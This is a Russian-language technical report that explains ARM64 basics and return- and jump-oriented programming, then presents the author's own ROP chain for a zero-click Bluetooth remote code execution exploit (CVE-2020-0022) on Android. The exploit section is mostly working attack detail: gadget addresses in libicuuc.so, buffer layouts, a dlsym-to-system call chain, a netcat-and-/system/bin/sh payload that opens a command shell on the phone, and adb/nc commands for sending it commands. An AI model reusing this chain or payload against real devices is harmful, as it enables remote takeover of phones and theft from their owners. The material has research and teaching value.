# Возвратно-ориентированное программирование на платформе ARM64

## Краткое введение в ARM64 (Aarch64)

Процессоры с ядрами ARM сейчас достаточно популярны в среде разработчиков мобильных устройств и встраиваемых систем различного применения. Самые массовые из них — это смартфоны (и iOS и Android устройства используют данную архитектуру). Архитектура обладает такими привлекательными свойствами, как удобная и эффективная система команд, мощная поддержка при разработке не только аппаратной базы, но и программного обеспечения, высокая энергоэффективность. Рассмотрим основные особенности системы команд ARM64, которые пригодятся в дальнейшем:

### Регистры

Архитектура имеет 31 регистр общего назначения (X0-X30). Все они 64-битные, но мы можем адресовать младшие 32 бита с помощью префиксов (например w0,w1 и т.д.). Также существует и 32-й регистр XZR, который равен нулю при чтении (можно применять запись в регистр, но результат вычисления не будет никуда записан). В регистр X30 (link register) записывается адрес возврата из подпрограммы.

TODO: SP register

### Инструкции

Перечислю только самые базовые инструкции:
- **mov** аналогично архитектуре x86 копирует значение одного регистра в другой, также может использоваться для загрузки непосредственного значения в регистр
```asm
mov x0, x1; копирует x1 в x0
mov x1, 0x4141; загружает значение 0x4141 в x1
```
- **str/ldr** загрузка в/из регистра соответственно по указателю
```asm
str x0, [x29]; размещает значение x0 по адресу из ОП в x29
ldr x0, [x29]; загружает значение в x0 по адресу из ОП в x29
```
- **bl/blr** эквивалентно **call** в x86 - передает управление на адрес подпрограммы и размещает адрес возврата в X30
```asm
blr x0; вызывает подпрограмму по адресу в x0
```
- **b/br** эквивалентно **jmp** в x86 - безусловный переход по адресу

- **ret** несмотря на **ret** в x86 - здесь не используется стек, а просто управление передается по адресу возврата в X30

### Способы адресации

Используется 3 основных режима:
- Непосредственный: *[base, #offset]*
```asm
ldr x0, [sp, 0x10]; загружается значение в x0 из ОП по адресу sp+0x10
```
- Пре-индексный: *[base, #offset]!*
```asm
ldr x0, [sp, 0x10]!; загружается значение в x0 из ОП по адресу sp+0x10 и затем увеличивается значение sp на 0x10
```
- Пост-индексная: *[base], #offset*
```asm
ldr x0, [sp], 0x10; загружается значение в x0 из ОП по адресу sp и затем увеличивается значение sp на 0x10
```

### Стек и соглашения о вызове функций

- Регистры X0-X7 используются для передачи параметров в подпрограммы, остальные параметры расположены на стеке
- Адрес возврата сохраняется в X30, но в случае вложенных вызовов его значение сохраняется на стеке
- Регистр X29 (frame-pointer) - эквивалент ebp в x86. Все локальные переменные на стеке доступны относительно регистра X29. А в нем самом хранится адрес предыдущего стек-фрейма.  
## Общий обзор возвратно-ориентированного подхода

Метод возвратно-ориентированного программирования (ROP) дает преимущество атакующей стороне в плане возможности подстраивания своего вредоносного кода под различные программные системы. Атакующий анализирует программное обеспечение системы на предмет наличия *гаджетов* - фрагментов кода, выполняющих полезную для атакующего функцию (и чаще всего заканчивающиеся инструкцией **ret**). Например:
```asm
add x0, x1, x2
ret
```
Сканируя библиотеку с кодом интересующей системы, атакующий может собрать много полезных гаджетов, выполняя которые, возможно достичь цели атакующей стороны. Такие гаджеты - реально существующий код на атакуемой системы (обычно в исполняемых секциях shared-библиотек). Это значит, что такой код можно выполнить в обход мер безопасности, предотвращающих исполнение произвольного кода. Атакующий формирует цепочку таких гаджетов, получая таким образом полноценную программу, как показано на рис. .1:
![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/gadgets_chain.png)
Рис. 2.1 Формирование цепочки гаджетов

Другой похожий метод - Jump-Oriented Programming (JOP). Разница в них заключается в том, что выполняется поиск гаджетов, заканчивающихся на инструкцию **br/blr** (безусловный переход). Данный метод показан на рисунке .2:
![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/JOP_chain.png)
Рис. 2.2 Jump-Oriented Programming

Обычно этот способ используется, когда нет доступа к стеку (мы не можем изначально записать в него адреса гаджетов) и в каждом гаджете приходится учитывать адрес следующего в цепочке, что гораздо сложнее реализовать, чем ROP. Но потенциально у JOP больше возможностей, так как команды **br/blr** не ограничены рамками, установленными компилятором или средой исполнения (можно передать любой валидный адрес).

## ROP цепочка в Bluetooth эксплойте

Данный пример был написан лично мной для реализации zero-click RCE (уязвимости не требующей дополнительных действий со стороны пользователя) CVE-2020-0022. Исследователи уязвимости удалили реализацию ROP цепочки из своего кода, так как эта часть зависит от конкретного устройства. В результате становится возможным удаленно исполнять shell-команды на атакуемом устройстве от имени Bluetooth процесса.

### Суть уязвимости в двух словах
Сама уязвимость состоит в неправильном пересчете размера Bluetooth пакета (протокол L2CAP) при его фрагментации. Возникает переполнение типа int, в функцию **memcpy** передается число 0xfffffffffffffffe (-2), но из-за специфической реализации **memcpy** (в libc.so), которая выполняет копирование не побайтно, а блоками по 8 байт (размер регистров в ARM64), часть данных в echo-пакете (куда происходит копирование с помощью **memcpy**) остаются неинициализированными и содержат данные адресного пространства Bluetooth процесса (Рис 3.1). 

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/android_memcpy.png)
Рис. 3.1 Некорректное поведение функции **memcpy** при передаче 0xfffffffffffffffe (-2) - данные выделенные красным не перезаписаны и передаются в echo-пакете атакующей стороне

По этим данным и смещениям в дизассемблированной библиотеке libicuuc.so вычисляется базовый адрес libicuuc.so (откуда впоследствии будут браться гаджеты, так как никаких других базовых адресов вычислить не удалось). Буфер с гаджетами и полезной нагрузкой (команды на открытие порта на прослушивание и исполнение команд) записывается в память. Затем с помощью еще одного переполнения в библиотеке **libchrome.so** C++ объект *Signal* перезаписывается на адрес буфера и поток выполнения передается на буфер с гаджетами (примерно в 70% случаев перезапись производится неправильно и  возникает ситуация, приведенная на рис .2). Но после каждого аварийного завершения процесса, процесс Bluetooth запускается вновь с теми же базовыми адресами библиотек, поэтому не нужно тратить время на повторное вычисление базового адреса libicuuc.so.

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/incorrect_signal_overflow.png)
Рис. 3.2 Левая часть - crash-лог, показывающий неправильную перезапись объекта *Signal* в */system/lib64/libchrome.so*, справа - дизассемблированный код объекта *Signal*

```asm
.text:00000000000DCC4C                 LDR             X8, [X0]  ; X0 уже перезаписан
.text:00000000000DCC50                 LDR             X8, [X8]
.text:00000000000DCC54                 BLR             X8        ; получаем контроль над pc
```
Место в коде, где происходит получение контроля над потоком исполнения

Задача ROP-цепочки в данном эксплойте - вызвать функцию **system**, которая откроет на устройстве определенный порт на прослушивание и будет исполнять команды, полученные таким образом. Для этого необходимо получить адрес **system**, который изначально неизвестен, из-за рандомизации адресного пространства процесса Bluetooth (ASLR). Но, к счастью, существует функция компоновщика **dlsym**, которая принимает на вход строку - название функции и  возвращает ее адрес. Поэтому вся задача сводится к вызову **dlsym**, сохранению возвращенного значения, инициализации параметров для функции **system** и передаче потока исполнения на сохраненный адрес.

### Поиск гаджетов

Поиск нужных гаджетов в библиотеке libicuuc.so производился с помощью утилиты **ropper**. Она выводит все возможные гаджеты из файла формата ELF. Пример ее работы приведен на рис 3.3

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ropper_ex.png)

Рис. 3.3 Пример поиска гаджета ldr x0, [x0, *offset*] с помощью **ropper**

### Как производилась отладка на устройстве (Samsung galaxy S9+ Android 9)

Продемонстрирую работу эксплойта без ROP цепочки. Отладка производилась с помощью анализа crash-логов в директории */data/tombstones* (рис 3.4).

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/signal_obj_crash_v2.png)
Рис. .4 crash-лог эксплойта без ROP цепочки

В данном случае в буфере находится только адрес первого гаджета, поэтому в ходе **blr X8** (в X8 окажется 0x5a5a5a5a5a5a5a5a) возник **SIGBUS** (ошибка шины, при обращении к физической памяти). Наполнение буфера приведено на рис 3.5

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/g1_preview.png)

Рис. 3.5 Состояние буфера без ROP-цепочки

### u_cleanup_60

Рассмотрим дизассемблированный код C++ деструктора **u_cleanup_60** в библиотеке **libicuuc.so**. Деструктор итерируется по массиву адресов функций и каждый раз вызывает функцию, после этого зануляя элемент массива. Более детально:
1) Выполняется загрузка в регистр X8 памяти по адресу, находящемуся в X19 + offset
2) Происходит безусловный переход по адресу в регистре X8
3) С помощью X19 адрес вызванной функции в буфере зануляется

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/u_cleanup_60.png)

Рис. 3.6  Дизассемблированный код C++ деструктора **u_cleanup_60**

Этот деструктор удобен тем, что мы от Jump-oriented подхода, где надо постоянно контролировать переход на следующий гаджет, можем перейти к подобию возвратно-ориентированного подхода, просто указав подряд нужные гаджеты, только здесь роль SP будет играть X19. Таким образом, с его помощью можно перейти к гаджетам, которые заканчиваются на **ret** и не беспокоиться о перехвате потока исполнения. Единственный минус - мы лишаемся регистров X8 и X19 (так как они задействованы в **u_cleanup_60**), поэтому потенциальное число полезных гаджетов снижается.

### Перезапись регистра X19 и вызов u_cleanup_60

Перед тем, как воспользоваться **u_cleanup_60**, необходимо правильно инициализировать X19 указателем на массив функций. Для этого использовались следующие гаджеты (далее все гаджеты будут приводиться с их относительным адресом в libicuuc.so, а за указатель на начало буфера с гаджетами будет принят 0x0000007864678418, хотя в общем случае это может быть не так):

Напомню, что изначально в x0 находится указатель на начало буфера с гаджетами. 
```asm
0x0000000000128560: ldr x0, [x0, #8]; инициализация X0 адресом из буфера
                    ldr x8, [x0]; инициализация X8 - значением по этому адресу
                    ldr x2, [x8, #0x40]; инициализация X2 - значением по адресу в буфере относительно x8
                    br x2; переход на следующий гаджет
```

Гаджет 1 (Инициализация X0 адресом из буфера и X8 - значением по этому адресу. Затем - переход на следующий гаджет через адрес в буфере относительно X8)

После гаджета 1:
```asm
X0 : 0x0000007864678428 ; [адрес начала буфера + 0x8]
X8 : 0x0000007864678430 ; [X0]
X2 : gadget2            ; [X8, #0x40] 
```

```asm
0x0000000000141dfc: ldr x0, [x8, #8]; Загрузка в X0 адреса из буфера относительно X8 (далее это значение будет в X19)
                    ldr x8, [x0]; 
                    ldr x8, [x8, #0x50]; Загрузка в X8 адреса из буфера относительно X0 (адрес следующего гаджета)
                    blr x8; переход на следующий гаджет
```

Гаджет 2 (Предварительная запись X0 значением для дальнейшей инициализации X19)

После гаджета2:
```asm
X0 : 0x0000007864678438
X8 : gadget3  [0x0000007864678438 + 0x50]
```

```asm
0x00000000000ed704: mov x19, x0; инициализация X19 указателем на начало массива с адресами гаджетов
                    mov x20, x1; 
                    mov x0, x20; 
                    ldr x8, [x19, #8]; Загрузка в X8 адреса из буфера относительно X19 (адрес u_cleanup_60)
                    blr x8; переход на u_cleanup_60
```

Гаджет 3 (Инициализация X19 указателем на начало массива с адресами гаджетов и вызов u_cleanup_60)

После гаджета3:
```asm
X0  : X1
X8  : 0x0000007864678440 [u_cleanup60 + offset]
X19 : 0x0000007864678438
```

*offset* задавался такой, чтобы u_cleanup60 начинал проход с адреса [X19, #0x10] (**libicuuc_base + 0xBCA10**)

```asm
0x0000000000064f00: mov x0, xzr; ret;
```
SET_X0_TO_NULL (гаджет для загрузки 0 в X0 - для отладки вызова **u_cleanup_60**, но пригодится и на следующем этапе)

На рис. 3.7 приведено наполнение буфера с гаджетами на данном этапе

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ucleanup_60_buffer.png)

Рис. 3.7 наполнение буфера с гаджетами для инициализации X19 (для каждого гаджета отдельным цветом выделены адреса в буфере, которые он использует)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ucleanup_60_result.png)

Рис. 3.8 результат вызова **u_cleanup_60** с SET_X0_TO_NULL (отмечено значение регистров X0 и PC - на каком адресе произошел **SIGBUS**)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/ucleanup60_res2.png)

Рис. 3.9 состояние памяти после вызова **u_cleanup_60** с SET_X0_TO_NULL

Занулился адрес SET_X0_TO_NULL (**u_cleanup_60** проитерировался по нему и **SIGBUS** возник при попытке обращения к 0x00000000dead0007)

### Вызов dlsym

Из заголовка функции **dlsym**:

```c++
void *dlsym(void *handle, char *symbol); загружает динамическую библиотеку, имя которой указано в строке filename, и возвращает прямой указатель на начало динамической библиотеки
```

В нашем случае *handle* должен быть NULL, поэтому и использовался гаджет SET_X0_TO_NULL. Но перед вызовом **dlsym** необходимо в X1 передать указатель на строку "system\0". Для этого изменился гаджет 3 на такой что, перед вызовом **u_cleanup_60**, выполняется переход на новые гаджеты 4 и 5, которые выполняют нужную инициализацию X1.

```asm
0x00000000000bb3d4: mov x19, x0; инициализация X19 указателем на начало массива с адресами гаджетов
                    ldr x0, [x19, #0x70]; сохранение x0 для будущих целей
                    cbz x0, #0x9f3ec; 
                    ldr x8, [x0];
                    ldr x8, [x8, #8]; Загрузка в X8 адреса из буфера относительно X0 (адрес гаджета 4)
                    blr x8; переход на гаджет 4 
```
Новый гаджет 3 (сохраняет X0 для будущих целей и переходит на гаджет 4)

После нового гаджета 3:
```asm
X0  : 0x00000078646784b0 (указатель на buf)
X8  : 0x00000078646784b8 [гаджет 4]
X19 : 0x0000007864678438
```

```asm
0x000000000006e354: ldr x8, [x0]; подготовка x8 к загрузке u_cleanup60 + offset
                    ldr x1, [x8, #0x10]; в x1 загружается адрес гаджета 5
                    br x1; переход на гаджет 5
```
Гаджет 4 (подготовка X8)

После гаджета 4:
```asm
X1  : 0x00000078646784c0 [гаджет 5]
X8  : 0x00000078646784b0 (buf указывает сам на себя)
```

```asm
0x00000000000a096c: ldr x1, [x19, #0x68]; в x1 загружается адрес строки "system\0"
                    ldr x8, [x8, #0x20]; в x8 загружается адрес u_cleanup60 + offset
                    blr x8; переход на u_cleanup60 + offset
```
Гаджет 5 (инициализация X1 и вызов **u_cleanup_60**)

После гаджета 5:
```asm
X1  : 0x00000078646784a0 (адрес строки "system\0")
X8  : 0x0000007864678440 [u_cleanup60 + offset]
```

При этом в массив функций для **u_cleanup_60** добавился адрес функции **dlsym**, адрес которой относительно базового адреса libicuuc.so может быть найден через relocation table, как представлено на рис. 3.10

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/dlsym_adr.png)

Рис. 3.10 нахождение адреса **dlsym**

На рис. 3.11 приведено наполнение буфера с гаджетами на данном этапе (показано, что buf указывает сам на себя, *buf указывает на buf, system\0 - расположение строки "system\0", *system\0 указывает на нее)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/dlsym_buffer.png)

Рис. 3.11 наполнение буфера с гаджетами для вызова **dlsym** (для каждого гаджета отдельным цветом выделены адреса в буфере, которые он использует)

В результате в X6 запишется адрес **system** и останется только вызвать эту функцию со следующей полезной нагрузкой:

```python
port = randint(10000, 65535)
# открытие порта port на прослушивание и исполнение команд, поступающих через порт 4444
payload += "cat /dev/zero | toybox nc -l -p %d | /system/bin/sh 2>&1 | toybox nc 127.0.0.1 4444 | toybox nc 127.0.0.1 %d > /dev/null\x00" % (port, port)
```

### Вызов system

После вызова **dlsym** деструктор **u_cleanup_60** итерируется далее и передает управление гаджету 6:

```asm
0x000000000008e1d0: ldr x0, [x19, #0x20]; подготовка X0 для следующих этапов
                    ldr x8, [x0]; 
                    ldr x8, [x8, #0x20]; загрузка в x8 адреса гаджета 7
                    blr x8; переход на гаджет 7
``` 
Гаджет 6 (подготовка X0)

После вызова **dlsym** было решено вернуться к Jump-oriented подходу, так как было недостаточно гаджетов, оканчивающихся на **ret** и не использующих X8 и X19. Поэтому гаджет 6 передает управлению гаджету 7 и т.д.

После гаджета 6:
```asm
X0  : 0x00000078646784d8 *buf2 (указатель на buf2)
X8  : 0x00000078646784f8 [гаджет 7]
```

```asm
0x000000000012f4f0: ldr x8, [x0, #0x38]; загрузка **payload в x8
                    ldr x1, [x8, #0x18]; загрузка в x1 адреса гаджета 8
                    br x1; переход на гаджет 8
```
Гаджет 7 (загрузка в X8 двойного указателя на строку с полезной нагрузкой - аргумента **system**)

После гаджета 7:
```asm
X1 : 0x0000007864678530 [гаджет 8]
X8  : 0x0000007864678510 **payload (указатель на указатель на строку с полезной нагрузкой в конце буфера)
```

```asm
0x00000000000c45a4: ldr x0, [x8]; загрузка *payload в x0 (аргумента system)
                    ldr x3, [x8, #0x10]; загрузка в x1 адреса CALL_SYSTEM
                    br x3; переход на CALL_SYSTEM
```
Гаджет 8 (инициализация аргумента функции **system**)

После гаджета 8:
```asm
X0 : 0x0000007864678518 *payload (указатель на строку с полезной нагрузкой в конце буфера)
X3 : 0x0000007864678528 адрес CALL_SYSTEM
```

CALL_SYSTEM - обычный безусловный переход по адресу в X6 (так как адрес **system** записался в X0)

```asm
0x00000000000a28a0: br x6;
```
CALL_SYSTEM

На рис. 3.12 приведено наполнение буфера с гаджетами на данном этапе. Аналогично buf, *buf2 указывает на buf2, buf2 указывает сам на себя. Для размещения *buf2 пришлось сместить адрес начала массива с указателями на функции для **u_cleanup_60** на 0x8 (соответственно изменился offset для вызова **u_cleanup_60**)

![](https://github.com/IgorKurylev/arm_rop_report/blob/master/pics/buffer_final.png)

Рис. 3.12 итоговое наполнение буфера с гаджетами

В результате вызова функции **system** становится возможным установить tcp - соединение с портом 4444 и отправлять команды на устройство следующим образом:

```sh
adb reverse tcp:4444 tcp:4444 # проброс порта через adb, чтобы отправлять команды на порт устройства через USB
nc -l -p 4444 # установление tcp  соединения через tcp порт 4444
# далее можно отправлять команды на устройство
```

